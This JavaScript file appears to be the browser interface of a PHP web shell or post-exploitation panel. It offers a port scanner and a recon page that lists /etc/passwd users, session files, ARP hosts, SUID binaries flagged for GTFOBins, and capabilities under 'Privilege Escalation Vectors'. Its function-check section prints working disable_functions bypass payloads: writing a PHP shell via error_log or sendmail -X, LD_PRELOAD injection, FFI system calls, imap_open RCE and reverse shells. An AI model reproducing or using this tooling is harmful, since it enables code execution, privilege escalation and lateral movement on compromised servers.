    return;
  }
  dbGetAll('scans').then(scans => {
    scans.sort((a, b) => (b.started_at || 0) - (a.started_at || 0));
    if (scans.length === 0) {
      body.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:12px">No scans yet.</div>';
      return;
    }
    body.innerHTML = scans.map(s => renderScanCard(s)).join('');
  }).catch(err => {
    body.innerHTML = '<div style="color:var(--red);font-size:13px;padding:12px">Error loading scans: ' + escHtml(String(err && err.message || err)) + '</div>';
  }).then(() => {
    _scanRendering = false;
    if (_scanRenderPending) {
      _scanRenderPending = false;
      renderScans();
    }
  });
}

function _scanStatusColor(status) {
  return ({
    running: 'var(--accent)', paused: 'var(--yellow)', stopped: 'var(--red)',
    done: 'var(--green)', idle: 'var(--muted)',
  })[status] || 'var(--muted)';
}

function renderScanHeader(s) {
  const opts = s.opts || {};
  let ctrls = '';
  if (s.status === 'running') {
    ctrls += '<button class="btn btn-sm btn-secondary" data-id="' + escHtml(s.id) + '" onclick="scanControl(this.dataset.id,\'pause\')">⏸ Pause</button>';
    ctrls += '<button class="btn btn-sm btn-danger" data-id="' + escHtml(s.id) + '" onclick="scanControl(this.dataset.id,\'stop\')">■ Stop</button>';
  } else if (s.status === 'paused') {
    ctrls += '<button class="btn btn-sm btn-primary" data-id="' + escHtml(s.id) + '" onclick="scanControl(this.dataset.id,\'resume\')">▶ Resume</button>';
    ctrls += '<button class="btn btn-sm btn-danger" data-id="' + escHtml(s.id) + '" onclick="scanControl(this.dataset.id,\'stop\')">■ Stop</button>';
  }
  let stoppedLocally = false;
  try { stoppedLocally = s.status === 'stopped' && !!localStorage.getItem('sx.scan_stopped.' + s.id); } catch (e) {}
  if (stoppedLocally) ctrls += '<span class="badge badge-no" title="stopped from this browser">&#9632; stopped locally</span>';
  if (typeof faradayExportScan === 'function') {
    ctrls += '<button class="btn btn-sm btn-secondary" data-id="' + escHtml(s.id) + '" onclick="faradayExportScan(this.dataset.id)" title="Export this scan as a faraday_json file">↑ Faraday</button>';
  }
  ctrls += '<button class="btn btn-sm btn-secondary" data-id="' + escHtml(s.id) + '" onclick="scanExportResults(this.dataset.id)">⬇ Export</button>';
  ctrls += '<button class="btn btn-sm btn-danger" data-id="' + escHtml(s.id) + '" onclick="scanDestroy(this.dataset.id)">✖ Delete</button>';

  // Pulsing live-dot for in-flight scans gives an at-a-glance "is it moving"
  // signal that the periodically-updated text counts can't convey.
  const liveDot = s.status === 'running'
    ? '<span class="live-dot" style="background:' + _scanStatusColor(s.status) + ';box-shadow:0 0 6px ' + _scanStatusColor(s.status) + '"></span>'
    : '';
  let h = '';
  h += '<div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">';
  h += liveDot;
  h += '<span style="color:' + _scanStatusColor(s.status) + ';font-weight:600;text-transform:uppercase;font-size:10.5px;letter-spacing:.08em">[' + escHtml(s.status) + ']</span>';
  h += '<span style="font-size:11.5px;color:var(--muted)">' + escHtml(s.id) + '</span>';
  h += '<span style="font-size:12px;color:var(--text)">' + escHtml(opts.targets_str || '') + '</span>';
  h += '<span style="font-size:11px;color:var(--muted)">ports: ' + escHtml(opts.ports_str || '') + ' · ' + escHtml(opts.proto || 'tcp') + '</span>';
  h += '</div>';
  h += '<div class="btn-group">' + ctrls + '</div>';
  return h;
}

function renderScanMeta(s) {
  const sum = s.summary || {};
  const pct = s.total ? Math.floor((s.cursor / s.total) * 100) : 0;
  const elapsed = (s.finished_at || Math.floor(Date.now()/1000)) - (s.started_at || 0);
  let h = '';
  h += '<div style="display:flex;gap:14px;flex-wrap:wrap;font-size:12px;margin-bottom:10px">';
  h += '<span><span style="color:var(--muted)">progress:</span> ' + s.cursor + '/' + s.total + ' (' + pct + '%)</span>';
  h += '<span style="color:var(--green)">open: ' + (sum.open || 0) + '</span>';
  h += '<span style="color:var(--muted)">closed: ' + (sum.closed || 0) + '</span>';
  h += '<span style="color:var(--muted)">filtered: ' + (sum.filtered || 0) + '</span>';
  h += '<span style="color:var(--muted)">elapsed: ' + elapsed + 's</span>';
  h += '</div>';
  // Stepped instrument-style progress bar — see .hud-bar in shell.css.
  h += '<div class="hud-bar" style="margin-bottom:10px">';
  h += '<div class="fill" style="width:' + pct + '%' + (s.status !== 'running' ? ';background:' + _scanStatusColor(s.status) : '') + '"></div>';
  h += '</div>';
  return h;
}

function renderScanCard(s) {
  let h = '';
  h += '<div class="card" id="scan-card-' + s.id + '" style="margin-bottom:12px">';
  h += '<div class="card-header" id="scan-header-' + s.id + '" style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px">';
  h +=   renderScanHeader(s);
  h += '</div>';
  h += '<div class="card-body">';
  h +=   '<div id="scan-meta-' + s.id + '">' + renderScanMeta(s) + '</div>';
  // results region — toggle persists across polls, content refreshed in place
  h += '<div style="font-size:12px">';
  h += '<a href="#" data-id="' + escHtml(s.id) + '" onclick="event.preventDefault();scanToggleResults(this.dataset.id)" style="color:var(--accent);text-decoration:none">Show open ports ▼</a>';
  h += '</div>';
  h += '<div id="scan-results-' + s.id + '" style="display:none;margin-top:10px" data-rendered-count="0"></div>';
  h += '</div></div>';
  return h;
}

// Surgical in-place update of one scan card. Called after every poll so the
// expanded results panel (if open) is NOT torn down — only header + meta
// re-render. If the panel is open and the result count grew, we silently
// re-render the panel content; otherwise we leave it alone (no flicker).
function updateScanCard(id) {
  return dbOpen().then(db => new Promise(res => {
    const g = db.transaction('scans', 'readonly').objectStore('scans').get(id);
    g.onsuccess = () => res(g.result);
  })).then(s => {
    if (!s) return;
    const card = document.getElementById('scan-card-' + id);
    if (!card) { renderScans(); return; }
    const header = document.getElementById('scan-header-' + id);
    const meta   = document.getElementById('scan-meta-' + id);
    if (header) header.innerHTML = renderScanHeader(s);
    if (meta)   meta.innerHTML   = renderScanMeta(s);
    const results = document.getElementById('scan-results-' + id);
    if (results && results.style.display !== 'none') {
      const seen = parseInt(results.getAttribute('data-rendered-count') || '0', 10);
      if ((s.summary && (s.summary.open || 0)) > seen) {
        scanLoadResults(id, results);
      }
    }
  });
}

function scanToggleResults(id) {
  const el = document.getElementById('scan-results-' + id);
  if (!el) return;
  if (el.style.display === 'none') {
    el.style.display = 'block';
    scanLoadResults(id, el);
  } else {
    el.style.display = 'none';
  }
}

function scanLoadResults(id, el) {
  if (!el.innerHTML) el.innerHTML = '<span class="spinner"></span> Loading...';
  dbGetByIndex('scan_results', 'by_scan', id).then(rows => {
    const interesting = rows.filter(r => r.state === 'open');
    interesting.sort((a, b) => {
      if (a.host !== b.host) return a.host.localeCompare(b.host, undefined, { numeric: true });
      return a.port - b.port;
    });
    el.setAttribute('data-rendered-count', String(interesting.length));
    if (interesting.length === 0) {
      el.innerHTML = '<div style="color:var(--muted);font-size:12px">No open ports yet.</div>';
      return;
    }
    const byHost = {};
    interesting.forEach(r => { (byHost[r.host] = byHost[r.host] || []).push(r); });
    let html = '';
    Object.entries(byHost).forEach(([host, ports]) => {
      html += '<div style="margin-bottom:10px">';
      html += '<div style="font-family:monospace;font-size:12px;color:var(--accent);margin-bottom:4px">' + escHtml(host) + ' <span style="color:var(--muted)">(' + ports.length + ' open)</span></div>';
      html += '<table class="file-table"><thead><tr><th>Port</th><th>Proto</th><th>State</th><th>Service</th><th>Version</th><th>Latency</th></tr></thead><tbody>';
      ports.forEach(p => {
        const tlsBadge = p.tls ? ' <span class="badge badge-ok" title="TLS cert">TLS</span>' : '';
        html += '<tr>';
        html += '<td>' + p.port + '</td>';
        html += '<td>' + escHtml(p.proto) + '</td>';
        html += '<td><span class="badge badge-ok">' + escHtml(p.state) + '</span></td>';
        html += '<td>' + escHtml(p.service || '') + tlsBadge + '</td>';
        html += '<td style="font-family:monospace;font-size:11px">' + escHtml((p.version || '').substring(0, 80)) + '</td>';
        html += '<td>' + (p.latency_ms || 0) + 'ms</td>';
        html += '</tr>';
        if (p.banner) {
          html += '<tr><td colspan="6" style="padding:0">';
          html += '<details style="background:rgba(0,0,0,.25);padding:6px 10px"><summary style="cursor:pointer;font-size:11px;color:var(--muted)">banner (' + p.banner.length + ' bytes)</summary>';
          html += '<pre style="margin:6px 0 0 0;font-size:11px;color:var(--text);white-space:pre-wrap;word-break:break-all">' + escHtml(p.banner) + '</pre>';
          if (p.tls) {
            html += '<div style="font-size:11px;color:var(--yellow);margin-top:6px">TLS: CN=' + escHtml(p.tls.subject_cn) +
                    ' issuer=' + escHtml(p.tls.issuer_cn) + ' valid=' + escHtml(p.tls.valid_from) + '→' + escHtml(p.tls.valid_to) +
                    (p.tls.self_signed ? ' <span style="color:var(--red)">[self-signed]</span>' : '') +
                    (p.tls.sans && p.tls.sans.length ? ' SANs=' + escHtml(p.tls.sans.join(',')) : '') + '</div>';
          }
          html += '</details></td></tr>';
        }
      });
      html += '</tbody></table></div>';
    });
    el.innerHTML = html;
  });
}

function scanExportResults(id) {
  dbGetByIndex('scan_results', 'by_scan', id).then(rows => {
    dbOpen().then(db => {
      const g = db.transaction('scans', 'readonly').objectStore('scans').get(id);
      g.onsuccess = () => {
        const data = { scan: g.result, results: rows };
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'scan_' + id + '_' + Date.now() + '.json';
        a.click();
      };
    });
  });
}

// Reattach pollers on load; refresh card view when user opens the Scanner tab
document.addEventListener('DOMContentLoaded', scanReattach);
if (document.readyState !== 'loading') scanReattach();


// ==================== DIAGNOSTICS ====================
// Solid 16×16 icons — same .icon treatment as sidebar (currentColor, no emoji font).
var DIAG_ICONS = {
  monitor: 'M1 2v12h14V2zm12 2v8H3V4zM5 6l1-1 3 3-3 3-1-1 2-2zm3 4h4v1H8z',
  user: 'M8 8a3 3 0 100-6 3 3 0 000 6zm-5 6c0-2.8 2.2-5 5-5s5 2.2 5 5v1H3v-1z',
  gear: 'M8 1.3l1 2.1 2.4.4-1.8 1.7.4 2.5L8 7.3 5 9.2l.4-2.5-1.8-1.7 2.4-.4L8 1.3z',
  layers: 'M2 2h5v5H2V2zm7 0h5v5H9V2zM2 9h5v5H2V9zm7 0h5v5H9V9z',
  users: 'M2 13v-1c0-2 1.8-3.5 4-3.5h4c2.2 0 4 1.5 4 3.5v1H2zm2-8.5a2 2 0 114 0 2 2 0 01-4 0zm6 0a2 2 0 114 0 2 2 0 01-4 0z',
  globe: 'M8 0a8 8 0 100 16A8 8 0 008 0zm0 2c.7 0 1.5.5 2.2 1.3L8 5 5.8 3.3C6.5 2.5 7.3 2 8 2zM4.4 4.5L7 6.5v2L4 11l-.5.5C2.6 10.5 2 9.3 2 8c0-1.3.5-2.5 1.4-3.5zM12.6 4.5C13.5 5.5 14 6.7 14 8c0 1.3-.5 2.5-1.4 3.5L12 11 9 8.5v-2zM7 10.5l1 1 1-1 2 2c-.7.5-1.8 1-3 1s-2.3-.5-3-1z',
  port: 'M2 3h12v10H2V3zm2 2v6h8V5H4zm2 1h1v1H6V6zm3 0h1v1H9V6zm-3 2h1v1H6V8zm3 0h1v1H9V8z',
  route: 'M2 2h4v4H2V2zm8 0h4v4h-4V2zM2 10h4v4H2v-4zm8 0h4v4h-4v-4zM7 7h2v2H7V7z',
  alert: 'M8 1L1 15h14L8 1zm0 4v4H7V8h2V5zm0 5v2H7v-2h2z',
  key: 'M6 1h4v2H9v1h2l-1 2v5H5V6L4 4h2V3H6V1z',
  shield: 'M8 1L2 4v4c0 3.3 2.4 5.8 6 6.9 3.6-1.1 6-3.6 6-6.9V4L8 1z',
  clock: 'M8 0a8 8 0 100 16A8 8 0 008 0zm0 2a6 6 0 110 12A6 6 0 018 2zm-1 2v5l4 2.5.8-1.4L8.5 8.2V4z',
  lock: 'M5 7V5a3 3 0 116 0v2h1v7H4V7h1zm1-4a2 2 0 00-2 2v1h4V5a2 2 0 00-2-2z',
  box: 'M2 4h12v8H2V4zm2 2v4h8V6H4z',
  disk: 'M2 3h12v10H2V3zm2 2v2h8V5H4zm0 4v2h8V9H4z',
  chip: 'M4 4h8v8H4V4zm2 2v4h4V6H6zM3 6h1v1H3V6zm10 0h1v1h-1V6zm0 4h1v1h-1v-1zM3 10h1v1H3v-1z',
  package: 'M2 3h12v2H4v8h8V5h2v8H2V3z',
  folder: 'M1 3v10h14V5H7L5 3z',
  edit: 'M11 2l3 3-7 7-3 1 1-3 7-7 3-3zM10 3l3 3',
  copy: 'M10 1H4a2 2 0 00-2 2v10a2 2 0 002 2h5v-1H4a1 1 0 01-1-1V3a1 1 0 011-1h6V1zm3 3h-3a2 2 0 00-2 2v7a1 1 0 001 1h4a1 1 0 001-1V6a2 2 0 00-2-2zm0 1a1 1 0 011 1v7h-4V6h3z',
  home: 'M2 7l6-5 6 5v8H9v-5H7v5H2V7z',
  tag: 'M3 3h7l4 4v6H3V3zm2 2v2h3V5H5z',
  play: 'M3 2v12l11-6L3 2z',
  search: 'M6.5 1a5.5 5.5 0 014.4 8.8l3.8 3.8-1.4 1.4-3.8-3.8A5.5 5.5 0 116.5 1zm0 2a3.5 3.5 0 100 7 3.5 3.5 0 000-7z',
  ban: 'M8 1a7 7 0 100 14A7 7 0 008 1zm3.5 10.5L4.5 5 5.9 3.5 11 8.9l1.6-1.4z',
  warn: 'M8 1L1 15h14L8 1zm-.5 4v4h1V5h-1zm0 5v2h1v-2h-1z',
  chevron: 'M6 3l4 5-4 5V3z',
  check: 'M3 8l3 3 7-7-1.4-1.4L6 8.2 4.4 6.6 3 8z',
  file: 'M3 1v14h10V5L9 1zm6 1l4 4H9z',
};

function diagIcon(id, extraClass) {
  var path = DIAG_ICONS[id];
  if (!path) return '';
  var cls = 'icon' + (extraClass ? ' ' + extraClass : '');
  return '<svg class="' + cls + '" viewBox="0 0 16 16" aria-hidden="true"><path d="' + path + '"/></svg>';
}

function diagIconInline(id) {
  return diagIcon(id, 'icon-inline');
}

function diagIconButton(id, title, onclick) {
  return '<button type="button" class="btn btn-plain" style="padding:4px;margin-left:4px;display:flex;align-items:center;justify-content:center;" title="' + escHtml(title) + '" onclick="' + onclick + '">' + diagIconInline(id) + '</button>';
}

function diagCardHeader(title, iconId) {
  return '<div class="card-header"><span class="card-header-title">' + diagIcon(iconId) + escHtml(title) + '</span>' + diagCopyBtn() + '</div>';
}

function diagSectionTitle(title, iconId) {
  return '<div class="diag-section-title"><span class="card-header-title">' + diagIcon(iconId) + escHtml(title) + '</span></div>';
}

function diagCopyBtn() {
  return '<button class="btn btn-secondary btn-sm" onclick="diagCopy(this)" style="margin-left:auto;flex-shrink:0">Copy</button>';
}

function diagCopy(btn) {
  const card = btn.closest('.card');
  if (!card) return;
  const body = card.querySelector('.card-body');
  if (!body) return;
  let text = '';
  const table = body.querySelector('table');
  if (table) {
    const rows = table.querySelectorAll('tr');
    rows.forEach(function(row) {
      const cells = row.querySelectorAll('th, td');
      const vals = [];
      cells.forEach(function(c) { vals.push(c.textContent.trim()); });
      text += vals.join('\t') + '\n';
    });
  } else {
    const items = body.querySelectorAll('.diag-item');
    if (items.length > 0) {
      items.forEach(function(item) {
        const label = item.querySelector('.diag-label');
        const value = item.querySelector('.diag-value, .badge');
        if (label) text += label.textContent.trim() + ': ' + (value ? value.textContent.trim() : '') + '\n';
        else text += item.textContent.trim() + '\n';
      });
    } else {
      text = body.textContent.trim();
    }
  }
  clipCopy(text.trim()).then(function() {
    const orig = btn.textContent;
    btn.textContent = 'Copied!';
    setTimeout(function() { btn.textContent = orig; }, 1200);
  });
}

function diagCopyText(btn, text) {
  if (typeof text !== 'string') text = String(text);
  clipCopy(text).then(function() {
    const orig = btn.innerHTML;
    btn.textContent = 'Copied';
    setTimeout(function() { btn.innerHTML = orig; }, 1200);
  });
}

function loadDiag() {
  const body = document.getElementById('diag-body');
  body.innerHTML = '<span class="spinner"></span>Running full recon...';

  const fd = new FormData();
  fd.append('action', 'diag');

  window._diagInFlight = fetchJSON(fd)
    .then(function(d) {
      if (d.error) {
        body.innerHTML = '<div style="color:var(--red)">Backend error: ' + escHtml(d.error) + '</div>';
        return;
      }
      // Cache the freshest diag blob so the Faraday export module can read it
      // without re-running the recon scan.
      window._lastDiagBlob = d;
      let html = '';

      // ---- ROW 1: System (includes identity rows) ----
      html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('System', 'monitor') + '<div class="card-body">';
      [
        ['PHP', d.php_version],
        ['OS', d.os],
        ['Server', d.server],
        ['CWD', d.cwd],
        ['Disk Free', formatBytes(d.disk_free) + ' / ' + formatBytes(d.disk_total)],
        ['allow_url_fopen', d.allow_url_fopen ? '<span class="badge badge-ok">ON</span>' : '<span class="badge badge-no">OFF</span>'],
        ['open_basedir', d.open_basedir],
        ['sendmail_path', d.sendmail_path],
      ].forEach(function(kv) {
        html += '<div class="diag-item"><span class="diag-label">' + kv[0] + '</span><span class="diag-value">' + kv[1] + '</span></div>';
      });
      [
        ['User', d.user_name + ' (uid=' + d.uid + ')'],
        ['Group', d.group_name + ' (gid=' + d.gid + ')'],
        ['Groups', d.groups || 'none'],
      ].forEach(function(kv) {
        html += '<div class="diag-item"><span class="diag-label">' + kv[0] + '</span><span class="diag-value">' + kv[1] + '</span></div>';
      });
      if (d.group_memberships && Object.keys(d.group_memberships).length > 0) {
        html += '<div class="diag-alert diag-alert--danger" style="margin-top:8px">' + diagIconInline('warn') + 'Privileged group members:</div>';
        Object.entries(d.group_memberships).forEach(function(e) {
          html += '<div class="diag-item"><span class="diag-label" style="color:var(--yellow)">' + escHtml(e[0]) + '</span><span class="diag-value">' + e[1].map(escHtml).join(', ') + '</span></div>';
        });
      }
      if (d.container && d.container.detected) {
        html += '<div style="margin-top:10px;padding:8px;background:rgba(210,153,34,.1);border-radius:4px">';
        html += '<div class="diag-alert diag-alert--warn">' + diagIconInline('warn') + 'Container detected: ' + escHtml(d.container.type || 'unknown') + '</div>';
        html += '<div class="diag-note" style="margin-top:4px">' + (d.container.hints || []).map(escHtml).join(', ') + '</div>';
        html += '</div>';
      }
      html += '</div></div>';

      // ---- Session storage info ----
      if (d.session) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('PHP Sessions', 'package') + '<div class="card-body">';
        // Summary rows removed — detailed R/W and path shown in the files table below.
        if (d.session.files_sample && d.session.files_sample.length > 0) {
          html += '<div class="diag-subsection-title">Session files (sample)</div>';
          html += '<table class="file-table"><thead><tr><th>Path</th><th>Size</th><th>Modified</th><th>R</th><th>W</th></tr></thead><tbody>';
          d.session.files_sample.forEach(function(f) {
            const escPath = escHtml(f.path);
            const rawPath = JSON.stringify(f.path);
            html += '<tr><td>';
            html += '<div class="flex-row" style="min-width:0;gap:6px">';
            html += '<button class="btn btn-plain" style="padding:0 3px;flex-shrink:0;display:flex;align-items:center;color:var(--muted)" title="Expand" onclick=\'diagToggleSessionFile(this, ' + rawPath + ')\'>' + diagIconInline('chevron') + '</button>';
            html += '<span class="mono-sm copyable" style="flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="Click to copy path">' + escPath + '</span>';
            html += '</div>';
            html += '</td>';
            html += '<td>' + escHtml(String(f.size || 0)) + '</td><td>' + escHtml(f.mtime ? new Date(f.mtime * 1000).toISOString() : '') + '</td>';
            html += '<td>' + (f.readable ? '<span class="badge badge-ok">R</span>' : '<span class="badge badge-no">-</span>') + '</td>';
            html += '<td>' + (f.writable ? '<span class="badge badge-no">W</span>' : '<span class="badge badge-ok">-</span>') + '</td></tr>';
          });
          html += '</tbody></table>';
        }
        html += '</div></div>';
      }

      // ---- ROW 2: Functions + Extensions ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';
      html += '<div class="card" style="margin:0">' + diagCardHeader('Functions', 'gear') + '<div class="card-body">';
      const fn = d.functions || {};
      const directExec = ['exec','shell_exec','system','passthru','popen','proc_open','pcntl_exec'];
      const hasDirectExec = directExec.some(function(f) { return fn[f]; });
      Object.entries(fn).forEach(function(e) {
        html += '<div class="diag-item"><span class="diag-label">' + e[0] + '</span>' +
          (e[1] ? '<span class="badge badge-ok">\u2714 available</span>' : '<span class="badge badge-no">\u2716 disabled</span>') + '</div>';
      });
      // Indirect execution hints when all direct exec is disabled
      if (!hasDirectExec) {
        html += '<div style="margin-top:12px;padding:10px;background:rgba(210,153,34,.08);border:1px solid rgba(210,153,34,.2);border-radius:6px;font-size:11px">';
        html += '<div style="color:var(--yellow);font-weight:600;margin-bottom:6px">All direct exec disabled \u2014 indirect vectors:</div>';
        const hints = [];
        if (fn['mail']) hints.push('<b>mail()</b> \u2014 write files via sendmail -X flag: <code>mail("a","","","","-OQueueDirectory=/tmp -X/path/shell.php")</code>');
        if (fn['error_log']) hints.push('<b>error_log()</b> \u2014 write to arbitrary file (type 3): <code>error_log("&lt;?php system($_GET[c]);?&gt;", 3, "/path/shell.php")</code>');
        if (fn['mail'] && fn['putenv']) hints.push('<b>mail() + putenv()</b> \u2014 LD_PRELOAD injection: set LD_PRELOAD to malicious .so, then call mail() to trigger sendmail');
        if (fn['ob_start']) hints.push('<b>ob_start()</b> \u2014 callback exec: <code>ob_start("system"); echo "id"; ob_end_flush();</code> (only if system() not in disable_functions)');
        if (fn['fsockopen']) hints.push('<b>fsockopen()</b> \u2014 connect to internal services, reverse shells via raw sockets');
        if (fn['FFI']) hints.push('<b>FFI</b> \u2014 call libc system()/exec() directly: <code>FFI::cdef("int system(const char*);")->system("id")</code>');
        if (fn['imap_open']) hints.push('<b>imap_open()</b> \u2014 RCE via -oProxyCommand SSH flag injection');
        if (fn['pcntl_fork']) hints.push('<b>pcntl_fork()</b> \u2014 fork process, combine with other vectors');
        if (hints.length > 0) {
          hints.forEach(function(h) { html += '<div style="margin-bottom:4px;color:var(--fg)">\u2022 ' + h + '</div>'; });
        } else {
          html += '<div style="color:var(--muted)">No known indirect vectors available.</div>';
        }
        html += '</div>';
      }
      if (d.disable_functions) {
        html += '<div class="diag-raw-toggle" onclick="this.nextElementSibling.classList.toggle(\'visible\')">' + diagIconInline('chevron') + 'Raw disable_functions ini</div>';
        html += '<div class="diag-raw-content">' + escHtml(d.disable_functions) + '</div>';
      }
      html += '</div></div>';

      html += '<div class="card" style="margin:0">' + diagCardHeader('Extensions & Tools', 'layers') + '<div class="card-body">';
      html += '<div style="margin-bottom:10px;display:flex;flex-wrap:wrap;gap:6px">';
      Object.entries(d.extensions || {}).forEach(function(e) {
        html += '<span class="badge ' + (e[1] ? 'badge-ok' : 'badge-no') + '">' + e[0] + '</span>';
      });
      html += '</div>';
      if (d.interpreters && d.interpreters.length > 0) {
        html += '<div class="diag-subsection-title">Interpreters</div>';
        html += '<div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px">';
        d.interpreters.forEach(function(t) { html += '<span class="badge badge-ok">' + escHtml(t) + '</span>'; });
        html += '</div>';
      }
      if (d.tools && d.tools.length > 0) {
        html += '<div class="diag-subsection-title">Tools</div>';
        html += '<div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px">';
        d.tools.forEach(function(t) { html += '<span class="badge badge-ok">' + escHtml(t) + '</span>'; });
        html += '</div>';
      }
      if (d.all_binaries) {
        html += '<div style="font-size:11px;color:var(--muted)">' + d.all_binaries.length + ' binaries total across all bin dirs</div>';
      }
      html += '</div></div>';
      html += '</div>';

      // ---- Users with login shells ----
      if (d.passwd_users && d.passwd_users.length > 0) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Login Users (/etc/passwd)', 'users') + '<div class="card-body" style="padding:0">';
        html += '<table class="file-table"><thead><tr><th>User</th><th>UID</th><th>Home</th><th>Shell</th></tr></thead><tbody>';
        d.passwd_users.forEach(function(u) {
          const highlight = (parseInt(u.uid) === 0 || parseInt(u.uid) >= 1000) ? 'color:var(--yellow)' : '';
          html += '<tr><td style="' + highlight + '">' + escHtml(u.user) + '</td><td>' + escHtml(u.uid) + '</td><td>' + escHtml(u.home) + '</td><td>' + escHtml(u.shell) + '</td></tr>';
        });
        html += '</tbody></table></div></div>';
      }

      // ---- Network ----
      html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Network \u2014 This Host', 'globe') + '<div class="card-body">';
      [
        ['Shell IP', d.target_ip || '\u2014'],
        ['Hostname', d.target_host || '\u2014'],
        ['Default gateway', d.default_gateway || '\u2014'],
      ].forEach(function(kv) {
        html += '<div class="diag-item"><span class="diag-label">' + kv[0] + '</span><span class="diag-value">' + escHtml(kv[1]) + '</span></div>';
      });
      if (d.network_ifaces && d.network_ifaces.length > 0) {
        html += '<div class="diag-subsection-title">Interfaces</div>';
        html += '<table class="file-table"><thead><tr><th>Iface</th><th>IP</th><th>Netmask</th><th>MAC</th></tr></thead><tbody>';
        d.network_ifaces.forEach(function(i) {
          html += '<tr><td>' + escHtml(i.iface) + '</td><td>' + escHtml(i.ip) + '</td><td>' + escHtml(i.netmask || '') + '</td><td style="font-size:11px;color:var(--muted)">' + escHtml(i.mac || '') + '</td></tr>';
        });
        html += '</tbody></table>';
      }
      if (d.upstream_hosts && d.upstream_hosts.length > 0) {
        html += '<div class="diag-subsection-title">Upstream / client (not ARP)</div>';
        html += '<table class="file-table"><thead><tr><th>IP</th><th>Source</th><th>Note</th></tr></thead><tbody>';
        d.upstream_hosts.forEach(function(h) {
          html += '<tr><td>' + escHtml(h.ip) + '</td><td>' + escHtml(h.source) + '</td><td style="font-size:11px;color:var(--muted)">' + escHtml(h.note || '') + '</td></tr>';
        });
        html += '</tbody></table>';
      }
      html += '</div></div>';

      html += '<div class="diag-grid" style="margin-bottom:16px">';

      html += '<div class="card" style="margin:0">' + diagCardHeader('Network \u2014 ARP Hosts', 'globe') + '<div class="card-body" style="padding:0">';
      if (d.arp_hosts && d.arp_hosts.length > 0) {
        html += '<table class="file-table"><thead><tr><th>IP</th><th>MAC</th><th>Iface</th></tr></thead><tbody>';
        d.arp_hosts.forEach(function(h) {
          html += '<tr><td>' + escHtml(h.ip) + '</td><td style="font-size:11px;color:var(--muted)">' + escHtml(h.mac) + '</td><td>' + escHtml(h.dev) + '</td></tr>';
        });
        html += '</tbody></table>';
      } else { html += '<div class="diag-empty">No ARP entries.</div>'; }
      html += '</div></div>';

      html += '<div class="card" style="margin:0">' + diagCardHeader('Open Ports (listening)', 'port') + '<div class="card-body" style="padding:0">';
      if (d.open_ports && d.open_ports.length > 0) {
        html += '<table class="file-table"><thead><tr><th>Port</th><th>UID</th><th>PID</th><th>Process</th></tr></thead><tbody>';
        d.open_ports.forEach(function(p) {
          const port = typeof p === 'object' ? p.port : p;
          const puid = (typeof p === 'object' && p.uid != null) ? p.uid : '-';
          const pid = (typeof p === 'object' && p.pid) ? p.pid : '-';
          const cmd = (typeof p === 'object' && p.cmd) ? p.cmd : '-';
          html += '<tr><td><span class="badge badge-ok">' + escHtml(String(port)) + '</span></td><td style="' + (puid === 0 ? 'color:var(--red)' : '') + '">' + escHtml(String(puid)) + '</td><td>' + escHtml(String(pid)) + '</td><td style="font-size:11px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + escHtml(String(cmd)) + '</td></tr>';
        });
        html += '</tbody></table>';
      } else { html += '<div class="diag-empty">None detected.</div>'; }
      html += '</div></div>';
      html += '</div>';

      // Routing table
      if (d.routes && d.routes.length > 0) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Routes', 'route') + '<div class="card-body" style="padding:0">';
        html += '<table class="file-table"><thead><tr><th>Iface</th><th>Destination</th><th>Gateway</th><th>Mask</th><th>Metric</th></tr></thead><tbody>';
        d.routes.forEach(function(r) {
          html += '<tr><td>' + escHtml(r.iface) + '</td><td>' + escHtml(r.dest) + '</td><td>' + escHtml(r.gw) + '</td><td>' + escHtml(r.mask) + '</td><td>' + escHtml(String(r.metric != null ? r.metric : '')) + '</td></tr>';
        });
        html += '</tbody></table></div></div>';
      }

      // =====================================================
      // PRIVILEGE ESCALATION VECTORS
      // =====================================================
      html += diagSectionTitle('Privilege Escalation Vectors', 'alert');

      // --- SUID/SGID Binaries ---
      html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('SUID/SGID Binaries', 'key') + '<div class="card-body" style="padding:0">';
      if (d.suid_binaries && d.suid_binaries.length > 0) {
        html += '<div style="max-height:300px;overflow-y:auto">';
        html += '<table class="file-table"><thead><tr><th>Path</th><th>Owner</th><th>Type</th><th>GTFOBins</th></tr></thead><tbody>';
        d.suid_binaries.forEach(function(b) {
          const rowStyle = b.gtfobins ? 'background:rgba(248,81,73,.06)' : '';
          const typeStr = (b.suid ? 'SUID' : '') + (b.suid && b.sgid ? '+' : '') + (b.sgid ? 'SGID' : '');
          html += '<tr style="' + rowStyle + '"><td class="mono-sm">' + escHtml(b.path) + '</td>';
          html += '<td>' + (b.owner_uid === 0 ? '<span style="color:var(--red)">root</span>' : escHtml(String(b.owner_uid))) + '</td>';
          html += '<td><span class="badge badge-warn">' + typeStr + '</span></td>';
          html += '<td>' + (b.gtfobins ? '<span class="badge badge-no">' + diagIconInline('warn') + 'GTFOBins</span>' : '<span style="color:var(--muted)">-</span>') + '</td></tr>';
        });
        html += '</tbody></table></div>';
      } else { html += '<div class="diag-empty">None found (or scan restricted by open_basedir).</div>'; }
      html += '</div></div>';

      // --- Capabilities ---
      if (d.capabilities && Object.keys(d.capabilities).length > 0) {
        const dangerCaps = {'CAP_SETUID':1,'CAP_SYS_ADMIN':1,'CAP_DAC_OVERRIDE':1,'CAP_DAC_READ_SEARCH':1,'CAP_SYS_PTRACE':1,'CAP_NET_RAW':1,'CAP_FOWNER':1,'CAP_SYS_MODULE':1,'CAP_SETGID':1,'CAP_CHOWN':1};
        const capEff = d.capabilities['CapEff'];
        const capBnd = d.capabilities['CapBnd'];
        // CapBnd is "full" if all 41 standard bits set = 000001ffffffffff or higher
